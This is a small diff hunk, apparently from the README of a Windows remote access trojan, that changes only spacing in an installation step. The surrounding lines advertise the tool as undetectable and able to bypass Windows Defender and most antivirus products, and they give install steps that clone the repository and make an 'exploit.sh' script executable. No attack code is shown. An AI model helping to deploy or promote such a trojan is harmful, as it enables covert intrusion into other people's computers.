@@ -32,7 +32,7 @@
     A Fully Undectable Window RAT that bypass window 10 Defender protection and also bypass 99.9% of other antivirus protections.
     
 # Installation:
-    1.  git clone https://github.com/machine1337/window-rat
+    1. git clone https://github.com/machine1337/window-rat
     2. sudo chmod +x exploit.sh
     
 # Usage:
